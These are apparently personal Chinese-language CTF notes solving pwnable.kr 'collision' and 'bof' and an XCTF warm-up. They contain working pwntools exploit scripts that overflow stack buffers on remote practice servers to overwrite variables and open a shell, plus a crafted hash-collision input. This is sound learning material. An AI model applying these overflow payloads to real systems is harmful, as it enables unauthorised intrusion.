+ `read` 函数 `ssize_t read(int fd, void * buf, size_t count);` 在 `<unistd.h>` 中，从fd指示的流中传送count个字符到 `buf` 里面去。`0` 是 `stdin` ，`1` 是 `stdout` ，`2` 是 `stderr` 。



## collision

```python
import struct
a = 0x21DD09EC
b = a // 5
c = b + 4

res = 4 * struct.pack('<i', b) + struct.pack('<i', c)
print(res)
```

```bash
./col `echo -e '\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06'`
```

![image-20200927202739739](https://cdn.jsdelivr.net/gh/smallzhong/picgo-pic-bed@master/image-20200927202739739.png)



## 攻防世界第一题

```python
from pwn import *

r = remote("220.249.52.133",52438)

payload = 'a' * (0x20 - 0x18) + p64(1926)

r.recvuntil("What's Your Birth?\n")

r.sendline("2000")

r.recvuntil("What's Your Name?\n")

r.sendline(payload)

print(r.recv())
print(r.recv())
print(r.recv())
```





## bof

里面的 `gets` 函数不安全，导致可以修改传进来的参数。

![image-20200927204739206](https://cdn.jsdelivr.net/gh/smallzhong/picgo-pic-bed@master/image-20200927204739206.png)

而 `s` 变量在 `0x2c` 处，传进来的变量在 `0x08` 处，只要覆盖原来的变量替换成需要的值即可

![image-20200927204908459](https://cdn.jsdelivr.net/gh/smallzhong/picgo-pic-bed@master/image-20200927204908459.png)

exp如下

```python
from pwn import *

r = remote("pwnable.kr",9000)

payload = 'a' * (0x2c + 0x8) + p32(0xcafebabe)

r.sendline(payload)
r.interactive()
```

